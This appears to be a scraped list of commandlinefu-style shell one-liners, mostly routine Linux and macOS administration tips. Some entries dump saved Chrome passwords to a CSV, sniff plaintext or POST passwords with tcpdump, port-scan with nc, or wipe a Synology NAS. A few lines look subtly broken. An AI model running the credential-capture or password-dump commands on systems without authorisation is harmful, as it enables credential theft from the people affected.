(*) List packages manually installed with process currently running: `ps -eo cmd | awk '{print $1}'| sort -u | grep "^/" | xargs dpkg -S 2>/dev/null | awk -F: '{print $1}' | sort -u | xargs apt-mark showmanual`
(*) Debug pytest failures in the terminal: `pytest --pdbcls pudb.debugger:Debugger --pdb --capture=no`
(*) Generrate Cryptographically Secure RANDOM PASSWORD: `python -c "import string; import random;print(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16)))"`
(*) Bootstrap python-pip & setuptools: `python -m ensurepip --default-pip && python -m pip install --upgrade pip setuptools wheel`
(*) Serve current directory tree at http://$HOSTNAME:8000/: `python -m SimpleHTTPServer 8080`
(*) KDE Console Logout command (with confirmation dialog): `qdbus org.kde.ksmserver /KSMServer logout 1 0 0`
(*) Calculate your total world compile time. (Gentoo Distros): `qlist -I | xargs qlop -t | awk '{ if ($2 < 5400) secs += $2} END { printf("%dh:%dm:%ds\n", secs / 3600, (secs % 3600) / 60, secs % 60); }'`
(*) Print compile time in seconds package by package (Gentoo Distros): `qlist -I | xargs qlop -t |sort -t" " -rnk2`
(*) Shell bash iterate number range with for loop: `rangeBegin=10; rangeEnd=20; for numbers in $(eval echo "{$rangeBegin..$rangeEnd}"); do echo $numbers;done`
(*) Shell bash iterate number range with for loop: `rangeBegin=10; rangeEnd=20; for ((numbers=rangeBegin; numbers<=rangeEnd; numbers++)); do echo $numbers; done`
(*) Bitcoin Brainwallet Private Key Calculator: `(read -r passphrase; b58encode 80$( brainwallet_exponent "$passphrase" )$( brainwallet_checksum "$passphrase" ))`
(*) Rename anime fansubs: `rename -n 's/[_ ]?[\[\(]([A-Z0-9-+,\.]+)[\]\)][_ ]?//ig' '[subs4u]_Mushishi_S2_22_(hi10p,720p,ger.sub)[47B73AEB].mkv'`
(*) Add prefix of 0 place holders for a string: `rename 's/\d+/sprintf("%04d",$&)/e' *`
(*) Rename all files in lower case: `rename 'y/A-Z/a-z/' *`
(*) Identify all amazon cloudformation scripts recursively using ripgrep: `rg -l "AWSTemplateFormatVersion: '2010-09-09'" *`
(*) Route add default gateway: `route add default gw 192.168.10.1 //OR// ip route add default via 192.168.10.1 dev eth0 //OR// ip route add default via 192.168.10.1`
(*) Show your current network interface in use: `route | grep -m1 ^default | awk '{print $NF}'`
(*) Extract rpm package name, version and release using some fancy sed regex: `rpm -qa | sed 's/^\(.*\)-\([^-]\{1,\}\)-\([^-]\{1,\}\)$/\1 \2 \3/' | sort | column -t`
(*) Rsync should continue even if connection lost: `rsync --archive --recursive --compress --partial --progress --append root@123.123.123.123:/backup/somefile.txt.bz2 /home/ubuntu/`
(*) Rsync using SSH and outputing results to a text file: `rsync --delete --stats -zaAxh -e ssh /local_directory/ username@IP_of_remote:/Remote_Directory/ > /Text_file_Directory/backuplog.txt`
(*) Rsync using pem file: `rsync -e 'ssh -i /root/my.pem' -avz /mysql/db/data_summary.* ec2-1-2-4-9.compute-1.amazonaws.com:/mysql/test/`
(*) Check host port access using only Bash:: `s="$(cat 2>/dev/null < /dev/null > /dev/tcp/${target_ip}/${target_port} & WPID=$!; sleep 3 && kill $! >/dev/null 2>&1 & KPID=$!; wait $WPID && echo 1)" ; s="${s:-0}"; echo "${s}" | sed 's/0/2/;s/1/0/;s/2/1/'`
(*) VI/VIM Anonymize email address in log file: `%s/.\{5\}@.\{5\}/XXXXX@XXXXXX/g`
(*) Set RGB gamma of secondary monitor: `secondscreen=$(xrandr -q | grep " connected" | sed -n '2 p' | cut -f 1 -d ' '); [ "$secondscreen" ] && xrandr --output $secondscreen --gamma 0.6:0.75:1`
(*) Shell bash iterate number range with for loop: `seq 10 20`
(*) Generate a sequence of numbers.: `seq 12`
(*) Shuffle lines via perl: `seq 1 9 | perl -e 'print sort { (-1,1)[rand(2)] } <>'`
(*) Shuffle lines via perl: `seq 1 9 | perl -MList::Util=shuffle -e 'print shuffle <>;'`
(*) Shuffle lines via bash: `seq 1 9 | sort -R`
(*) Draw mesh: `seq -s " \\_/" 256|tr -d "0-9"|fold -70`
(*) Draw line separator: `seq -s '*' 40|tr -c '*' '*' && echo`
(*) Draw line separator (using knoppix5 idea): `seq -s '*' 40 | tr -dc '[*\n]'`
(*) Draw honeycomb: `seq -ws "\\__/" 99|fold -69|tr "0-9" " "`
(*) Add date stamp to filenames of photos by Sony Xperia camera app: `(setopt CSH_NULL_GLOB; cd /path/to/Camera\ Uploads; for i in DSC_* MOV_*; do mv -v $i "$(date +%F -d @$(stat -c '%Y' $i)) $i"; done)`
(*) Add timestamp of photos created by the â€œpredictive captureâ€ feature of Sony's Xperia camera app at the beginning of the filename: `(setopt CSH_NULL_GLOB; cd /path/to/Camera\ Uploads; for i in DSCPDC_000*; do mv -v $i "$(echo $i | perl -lpe 's/(DSCPDC_[0-9]{4}_BURST)([0-9]{4})([0-9]{2})([0-9]{2})/$2-$3-$4 $1$2$3$4/')"; done)`
(*) Stream a youtube video with mpv where $1 is the youtube link.: `setsid mpv --input-ipc-server=/tmp/mpvsoc$(date +%s) -quiet "$1" >/dev/null 2>&1`
(*) See n most used commands in your bash history: `sort ~/.bash_history|uniq -c|sort -n|tail -n 10`
(*) Sort by IP address: `sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4`
(*) Sort list of email addresses by domain.tld: `sort -t@ -k2 emails.txt`
(*) Decrypt passwords from Google Chrome and Chromium.: `sqlite3 -header -csv -separator "," ~/.config/google-chrome/Default/Login\ Data "SELECT * FROM logins" > ~/Passwords.csv`
(*) Test your bash skills.: `ssh bandit0@bandit.labs.overthewire.org -p 2220`
(*) SSH Copy ed25519 key into your host: `ssh-copy-id -i your-ed25519-key user@host`
(*) SSH connection through host in the middle: `ssh -J user@reachable_host user@unreacheable_host`
(*) Generate SSH public key from the private key: `ssh-keygen -y -f privatekey.pem > publickey.pem`
(*) Append a pub key from pem file and save in remote server accessing with another key: `ssh-keygen -y -f user-key.pem | ssh user@host -i already_on_remote_server_key.pem 'cat >> ~/.ssh/authorized_keys'`
(*) Port forwarding: `ssh -L8888:localhost:80 -i nov15a.pem ubuntu@123.21.167.60`
(*) Backup VPS disk to another host: `ssh root@vps.example -p22 "cat /dev/sda1 | gzip -1 - " > vps.sda1.img.gz`
(*) Find all clients connected to HTTP or HTTPS ports: `ss -o state established '( dport = :http or sport = :https )'`
(*) Show all current listening programs by port and pid with SS instead of netstat: `ss -plunt`
(*) List all accessed configuration files while executing a program in linux terminal (improved version): `strace 2>&1 <any_executable> |egrep -o "\".*\.conf\""`
(*) Find which config-file is read: `strace 2>&1  geany |grep geany.conf`
(*) Linux system calls of MySQL process: `strace -c -p $(pidof -s mysqld) -f -e trace=all`
(*) Listen YouTube radios streaming: `streamlink --player="cvlc --no-video" "https://www.youtube.com/freecodecamp/live" 720p|& tee /dev/null`
(*) Blktrace - generate traces of the i/o traffic on block devices: `sudo blktrace -d /dev/sda -o - | blkparse -i -`
(*) Clear Cached Memory on Ubuntu: `sudo free && sync && sudo echo 3 | sudo tee /proc/sys/vm/drop_caches`
(*) Manually trim SSD: `sudo fstrim -v /`
(*) Login history Mac OS X: `% sudo log show --style syslog  --last 2d | awk '/Enter/ && /unlockUIBecomesActive/ {print $1 " " $2}'`
(*) Using a single sudo to run multiple && arguments: `sudo -s <<< 'apt update -y && apt upgrade -y'`
(*) Using a single sudo to run multiple && arguments: `sudo sh -c 'apt update -y && apt upgrade -y'`
(*) Write shell script without opening an editor: `sudo su -c â€œecho -e \â€\x23\x21/usr/bin/sudo /bin/bash\napt-get -y \x24\x40\â€ > /usr/bin/apt-yesâ€`
(*) Restart Bluetooth from terminal: `sudo systemctl restart bluetooth`
(*) Add a DNS server on the fly: `sudo systemd-resolve --interface <NombreInterfaz> --set-dns <IPDNS> --set-domain mydomain.com`
(*) Capture SMTP / POP3 Email: `sudo tcpdump -nn -l port 25 | grep -i 'MAIL FROM\|RCPT TO'`
(*) Capture FTP Credentials and Commands: `sudo tcpdump -nn -v port ftp or ftp-data`
(*) Capture all plaintext passwords: `sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '`
(*) Extract HTTP Passwords in POST Requests: `sudo tcpdump -s 0 -A -n -l | egrep -i "POST /|pwd=|passwd=|password=|Host:"`
(*) Programmatic way to find and set your timezone: `sudo timedatectl set-timezone $(curl -s worldtimeapi.org/api/ip.txt | sed -n 's/^timezone: //p')`
(*) Enable Synology Debug mode on shell: `sudo /usr/syno/bin/synogear install && sudo su`
(*) Command to logout all the users in one command: `sudo who | awk '!/root/{ cmd="/sbin/pkill -KILL -u " $1; system(cmd)}'`
(*) Get CPU thermal data on MacOS: `sysctl machdep.xcpm.cpu_thermal_level`
(*) Filter the output of a file continously using tail and grep: `tail -f $FILENAME | grep --line-buffered $PATTERN`
(*) Realtime lines per second in a log file, with history: `tail -f access.log | pv -l -i10 -r -f 2>&1 >/dev/null  | tr /\\r \ \\n`
(*) Display the end of a logfile as new lines are added to the end: `tail -f logfile`
(*) Tail a log and replace according to a sed pattern: `tail -F logfile|while read l; do sed 's/find/replace/g' <<< $l; done`
(*) Filter the output of a file continously using tail and grep: `tail -f path | grep your-search-filter`
(*) Re-execute a command using a saved /proc/pid/cmdline file: `tail -zn+2 $CMDLINE_FILENAME | xargs -0 $COMMAND`
(*) Windows telnet: `Test-NetConnection -ComputerName example.com -Port 443`
(*) Quick integer CPU benchmark: `time cat /proc/cpuinfo |grep proc|wc -l|xargs seq|parallel -N 0 echo "2^2^20" '|' bc`
(*) Small CPU benchmark with PI, bc and time.: `time cat /proc/cpuinfo |grep proc|wc -l|xargs seq|parallel -N 0 echo "scale=4000\; a\(1\)\*4" '|' bc -l`
(*) Superfast portscanner: `time seq 65535 | parallel -k --joblog portscan -j9 --pipe --cat -j200% -n9000  --tagstring  '\033[30;3{=$_=++$::color%8=}m'  'nc -vz localhost $(head -n1 {})-$(tail -n1 {})'`
(*) Tmux start new session with title and execute command: `tmux new-session -d -s "SessionName" "htop"`
(*) Create a file and manipulate the date: `touch -d '-1 year' /tmp/oldfile`
(*) Clear terminal Screen: `tput clear`
(*) Mural graffiti: `tput setaf 1;tput rev;h=$(tput lines);w=$[$(tput cols)/6];c=$(seq -ws '_____|' $[$w+1]|tr -d "0-9");for a in $(seq $[$h/2]);do echo $c;echo ${c//|___/___|};done;tput cup 0;toilet -t -f bigmono12 "?LOVE";tput cup $h`
(*) Generate a random password 30 characters long: `tr -c -d "a-zA-Z0-9" </dev/urandom | dd bs=30 count=1 2>/dev/null;echo`
(*) Find top 10 largest files in /var directory (subdirectories and hidden files included ): `tree -ihafF /var | tr '[]' ' '| sort -k1hr|head -10`
(*) Tree command limit depth for recusive directory list: `tree -L 2 -u -g -p -d`
(*) Get the running Kernel and Install date: `uname -a;rpm -qi "kernel"-`uname -r`|grep "Install"`
(*) Print umask as letters (e.g. `rwxr-xr-x`) instead of number (e.g. `0022`): `unix-permissions convert.stat $(unix-permissions invert $(umask))`
(*) Emulate a root (fake) environment without fakeroot nor privileges: `unshare -r --fork --pid unshare -r --fork --pid --mount-proc bash`
(*) Infinite loop ssh: `until ssh login@10.0.0.1; do echo "Nope, keep trying!"; fi; sleep 10; done`
(*) Completely wipe all data on your Synology NAS and reinstall DSM.  (BE CAREFUL): `/usr/syno/sbin/./synodsdefault --factory-default`
(*) Reinstall a Synology NAS without loosing any data from commandline.: `/usr/syno/sbin/./synodsdefault --reinstall`
(*) Bash test check validate  if variable is number: `varNUM=12345; re='^[0-9]+$'; if ! [[ $varNUM =~ $re ]] ; then echo "error: Not a number"; fi`
(*) Watch how many tcp connections there are per state every two seconds.: `watch -c "netstat -natp 2>/dev/null | tail -n +3 | awk '{print \$6}' | sort | uniq -c"`
(*) Watch how many tcp connections there are per state every two seconds.: `watch -c "netstat -nt | awk 'FNR > 3 {print \$6}' | sort | uniq -c"`
(*) Monitor cpu in realtime.: `watch grep \"cpu MHz\" /proc/cpuinfo`
(*) Show top 50 running processes ordered by highest memory/cpu usage refreshing every 1s: `watch -n1 "ps aux --sort=-%mem,-%cpu | head -n 50"`
(*) Perform Real-time Process Monitoring Using Watch Utility: `watch -n 1 'ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head'`
(*) Show whats going on restoring files from a spectrum protect backup: `watch -n60 -d 'lsof -w /filesysname|grep -v NAME|awk '\''{$7=int($7/1073741824) " GB"; print $7, $9}'\'''`
(*) Monitor my process group tree: `watch "ps --forest -o pid=PID,tty=TTY,stat=STAT,time=TIME,pcpu=CPU,cmd=CMD -g $(ps -o sid= -p $(pgrep -f "<my_process_name>"))"`
(*) Watch TCP, UDP open ports in real time with socket summary.: `watch ss -stplu`
(*) Website recursive offline mirror with wget: `wget --mirror --convert-links --adjust-extension --page-requisites  --recursive  --no-parent  www.example.com`
(*) Write a bootable Linux .iso file directly to a USB-stick: `wget -O /dev/sdb https://cdimage.ubuntu.com/daily-live/current/eoan-desktop-amd64.iso`
(*) Compute newest kernel version from Makefile on Torvalds' git repository: `wget -qO - https://raw.githubusercontent.com/torvalds/linux/master/Makefile | head -n5 | grep -E '\ \=\ [0-9]{1,}' | cut -d' ' -f3 | tr '\n' '.' | sed -e "s/\.$//"`
(*) Application network trace based on application name: `while(1 -eq 1 ) {Get-Process -Name *APPNAME* | Select-Object -ExpandProperty ID | ForEach-Object {Get-NetTCPConnection -OwningProcess $_} -ErrorAction SilentlyContinue }`
(*) Watches every second, a directory listing as it changes: `while :; do clear; ls path/to/dir | wc -l; sleep 1; done`
(*) Console clock: `while sleep 1; do     tput sc;     tput cup 0 $(($(tput cols)-29));     date;     tput rc; done &`
(*) Alert visually until any key is pressed: `while true; do echo -e "\e[?5h\e[38;5;1m A L E R T  $(date)"; sleep 0.1; printf \\e[?5l; read -s -n1 -t1 && printf \\e[?5l && break; done`
(*) Generates a TV noise alike output in the terminal: `while true; do printf "$(awk -v c="$(tput cols)" -v s="$RANDOM" 'BEGIN{srand(s);while(--c>=0){printf("\xe2\x96\\%s",sprintf("%o",150+int(10*rand())));}}')";done`
(*) Infinite loop ssh: `while true; do ssh login@10.0.0.1; if [[ $? -ne 0 ]]; then echo "Nope, keep trying!"; fi; sleep 10; done`
(*) Whois filtering the important information: `whois commandlinefu.com | grep -E '^\s{3}'`
(*) Fast portscanner via xargs: `xargs -i -P 1200 nc -zvn {} 22 < textfile-with-hosts.txt`
(*) Apply an xdelta patch to a file: `xdelta -d -s original_file delta_patch patched_file`
(*) Make window transparent (50% opacity) in Gnome shell: `xprop -format _NET_WM_WINDOW_OPACITY 32c -set _NET_WM_WINDOW_OPACITY 0x7FFFFFFF`
(*) Draw honeycomb: `yes "\\__/ " | tr "\n" " " | fold -$((($COLUMNS-3)/6*6+3)) | head -$LINES`
(*) Convert JSON to YAML: `yq . -y <example.json`


